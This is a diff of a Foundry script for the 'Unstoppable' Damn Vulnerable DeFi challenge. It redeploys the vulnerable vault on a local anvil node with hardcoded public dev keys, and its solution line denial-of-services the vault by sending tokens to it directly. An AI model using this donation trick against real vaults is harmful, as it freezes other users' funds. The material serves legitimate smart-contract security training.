@@ -3,14 +3,18 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
+import {Script} from "forge-std/Script.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
 import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
 
-contract UnstoppableChallenge is Test {
-    address deployer = makeAddr("deployer");
-    address player = makeAddr("player");
-
+contract UnstoppableChallenge is Script, Test {
+    // anvil user1
+    address deployer = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
+    uint256 deployerPK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
+    // anvil user2
+    address player = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
+    uint256 userPK = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;
     uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
     uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;
 
@@ -26,17 +30,17 @@ contract UnstoppableChallenge is Test {
     }
 
     /**
-     * SETS UP CHALLENGE - DO NOT TOUCH
+    forge script src/unstoppable/Unstoppable.s.sol --rpc-url http://localhost:8545  -vvvv --broadcast
      */
-    function setUp() public {
-        startHoax(deployer);
+    function run() public {
+        vm.startBroadcast(deployerPK);
         // Deploy token and vault
         token = new DamnValuableToken();
         vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});
 
         // Deposit tokens to vault
         token.approve(address(vault), TOKENS_IN_VAULT);
-        vault.deposit(TOKENS_IN_VAULT, address(deployer));
+        vault.deposit(TOKENS_IN_VAULT, address(this));
 
         // Fund player's account with initial token balance
         token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
@@ -49,14 +53,28 @@ contract UnstoppableChallenge is Test {
         vm.expectEmit();
         emit UnstoppableMonitor.FlashLoanStatus(true);
         monitorContract.checkFlashLoan(100e18);
+        vm.stopBroadcast();
 
-        vm.stopPrank();
+        vm.startBroadcast(userPK);
+        // this line is to solve the challange
+        token.transfer(address(vault), 1e18);        
+        vm.stopBroadcast();
+
+        //isSolved checks:
+        vm.prank(deployer);
+        vm.expectEmit();
+        emit UnstoppableMonitor.FlashLoanStatus(false);
+        monitorContract.checkFlashLoan(100e18);
+        // And now the monitor paused the vault and transferred ownership to deployer
+        assertTrue(vault.paused(), "Vault is not paused");
+        assertEq(vault.owner(), deployer, "Vault did not change owner");
+
     }
 
     /**
      * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
      */
-    function test_assertInitialState() public {
+    function assertInitialState() public {
         // Check initial token balances
         assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
         assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);
@@ -87,12 +105,6 @@ contract UnstoppableChallenge is Test {
         monitorContract.checkFlashLoan(100e18);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
-    function test_unstoppable() public checkSolvedByPlayer {
-        token.transfer(address(vault), 1e18);        
-    }
 
 
     /**
